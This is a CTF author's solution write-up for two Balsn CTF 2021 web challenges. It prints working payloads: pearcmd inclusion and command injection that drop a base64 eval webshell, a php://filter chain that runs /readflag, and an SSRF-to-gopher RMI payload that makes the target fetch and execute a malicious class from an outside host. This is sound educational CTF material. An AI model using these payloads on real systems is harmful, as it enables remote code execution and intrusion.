# Balsn CTF 2021

# 2linephp

- Difficulty: ★
- Type: Web
- Solved: 8 / 284
- Tag: Warmup, PHP

## Source Code

- [2linephp](https://github.com/w181496/My-CTF-Challenges/blob/master/Balsn-CTF-2021/2linephp/)

## Solution

In 2020, I have made a similar challenge in a chinese CTF.

But the difference is that we can't use http/https and our webshell should start with `<?php`.

### Intened Solution
- `/?+channel-discover+kaibro.tw/302.php?&kaibro=/usr/local/lib/php/pearcmd`
    - 302.php will redirect to http://kaibro.tw/test.php
    - pear will download test.php to `/tmp/pear/temp/test.php`

### Unintended Solution

There are many interesting unintended solutions :D

- sol1 - command injection (from 0daysober)
    - `/?+install+-R+&kaibro=/usr/local/lib/php/pearcmd&+-R+/tmp/other+channel://pear.php.net/Archive_Tar-1.4.14`
    - `/?+bundle+-d+/tmp/;echo${IFS}PD9waHAgZXZhbCgkX1BPU1RbMF0pOyA/Pg==%7Cbase64${IFS}-d>/tmp/hello-0daysober.php;/+/tmp/other/tmp/pear/download/Archive_Tar-1.4.14.tgz+&kaibro=/usr/local/lib/php/pearcmd&`
    - `/index.php?+svntag+/tmp/;echo${IFS}PD9waHAgZXZhbCgkX1BPU1RbMF0pOyA/Pg==%7Cbase64${IFS}-d>/tmp/hello-0daysober.php;/Archive_Tar+&kaibro=/usr/local/lib/php/pearcmd&'`
- sol2 - php filter (from 10sec)
    - `/?+config-create+/&eHh4eD4qKipQRDl3YUhBZ2MzbHpkR1Z0S0NSZlIwVlVXMk50WkYwcE96czdQejRn<&kaibro=/usr/local/lib/php/pearcmd&/<meow>+/tmp/meoww.php`
    - `/?kaibro=php%3a//filter/read=string.strip_tags%7Cconvert.base64-decode%7Cstring.strip_tags%7Cconvert.base64-decode/resource=/tmp/meoww&cmd=/readflag`
- and more!

## Writeups

- [maple3142's writeup](https://blog.maple3142.net/2021/11/21/balsn-ctf-2021-writeups/#linephp)
- [HhhM's blog](https://redmango.top/article/69#2linephp)

---

# 4pple Music

- Difficulty: ★★
- Type: Web
- Solved: 2 / 284
- Tag: Java, RealWorld, BlackBox, Pentesting

## Source Code

- [4pple Music](https://github.com/w181496/My-CTF-Challenges/blob/master/Balsn-CTF-2021/4ppleMusic/)

## Solution

1. Find the SSRF vulnerability

```
POST /index.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Connection: close

url=http://kaibro.tw
```

2. Port Scanning to `flagserver.local`

There are many open ports on `flagserver.local`, like `34571`, `34572`, ...

If you visit http://flagserver.local:34572, you will see the following response:

```xml
<OBJECT
    NAME = "%APPLICATION%"
    classid = "clsid:8AD9C840-044E-11D1-B3E9-00805F499D93"
    codebase = "http://java.sun.com/products/plugin/autodl/jinstall-1_4_2_05-windows-i586.cab#Version=1,4,1,3"
    WIDTH = 100% HEIGHT = 100% >
    <PARAM NAME=CODE VALUE=com.ibm.sysmgt.raidmgr.mgtGUI.Launch>
    <PARAM NAME="type" VALUE="application/x-java-applet;jpi-version=1.4.2_05">
    <PARAM NAME="scriptable" VALUE="false">
    <PARAM NAME="cache_option" VALUE="Plugin">
    <PARAM NAME="cache_archive" VALUE="RaidManS.jar">
    <PARAM NAME="progressbar" value="true">
    <PARAM NAME="boxmessage" value="Loading %APPLICATION% ...">
    <PARAM NAME="progresscolor" value="blue">
    <PARAM NAME="image" value="help/scan_l.gif">
    <PARAM NAME="bgColor" VALUE="FFFFFF">
    <COMMENT>
	<EMBED
            NAME= "StorageManager"
            type = "application/x-java-applet;jpi-version=1.4.2_05"
            CODE = com.ibm.sysmgt.raidmgr.mgtGUI.Launch
            WIDTH = 100%
            HEIGHT = 100%
	        scriptable="false"
	        pluginspage="http://java.sun.com/getjava"
            image="/help/scan_l.gif"
            cache_option="Plugin"
            cache_archive="RaidManS.jar"
            progressbar="true"
            boxmessage="Loading %APPLICATION%..."
            progresscolor="blue"
            bgColor="FFFFFF">
	    <NOEMBED>
        Your browser can not load the Sun Java Applet Plugin...
        </NOEMBED>
	</EMBED>
    </COMMENT>
</OBJECT>
```

Try to google these keywords, and you will find `Adaptec Storage Manager`.

(The 404 page also tell you this is Adaptec Storage Manager Server: `Adaptec Storage Manager File Server:  Error 404.`)

So our target is to pwn this Adaptec Storage Manager server!

3. Attack RMI

If you [install Adaptec Storage Manager](https://adaptec.com/en-us/downloads/storage_manager/sm/productid=sas-3085&dn=adaptec+raid+3085.html) on your local machine or decompiling the RaidManS.jar, you will find that 34571 port is **RMI Registry** Service.

Next, you can send RMI header packet with `gopher://` to verify it:

```
url=gopher://flagserver.local:34571/_JRMI%2500%02K%2500%2500%2500%2500%2500%2500
```

->

```
N
172.18.0.3�z
```

Next step is to attack this RMI service and find the flag.

Because this service is very old (the newest release date is `25 Aug 2010`), so the jdk is very likely to be old too.

(In the old jdk version (< 6u45/7u21), if RMI can't find the class, it will try to load the class from the codebase.)

So we can try to attack the codebase, setting the codebase to our server:

```
gopher://flagserver.local:34571/_JRMI%2500%2502K%2500%2500%2500%2500%2500%2500P%25AC%25ED%2500%2505w%2522%2500%2500%2500%2500%2500%2500%2500%2502%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%25F6%25B6%2589%258D%258B%25F2%2586Cur%2500%2518%255BLjava.rmi.server.ObjID%253B%2587%2513%2500%25B8%25D0%252Cd%257E%2502%2500%2500pxp%2500%2500%2500%2500w%2508%2500%2500%2500%2500%2500%2500%2500%2500sr%2500%2510kaibro.RMILoader%2500%2500%2500%2500%2500%2500%2500%2501%2502%2500%2500t%2500%2516http%253A%252F%252F30cm.club%252F%252F%252F%252F%252F%252Fxpw%2501%2500%250A
```

This payload will download my [malicious class file](https://github.com/w181496/My-CTF-Challenges/blob/master/Balsn-CTF-2021/4ppleMusic/exploit/kaibro/RMILoader.java) from `http://30cm.club/kaibro/RMILoader.class` and execute it!

=> RCE!



Note: you should use correct jdk version to compile this malicious class, you can simply send a http request to your server and observe the user-agent to know the jdk version of the RMI service:

`HTTP/1.1" 200 1395 "-" "Java/1.6.0_16"`


<br>

(Actually, this is a realworld case reproduced. Maybe it is boring, but I think it is suitable for people to learn how to attack RMI in realworld.)

## Writeups
- [HhhM's blog](https://redmango.top/article/69#4pple-music)
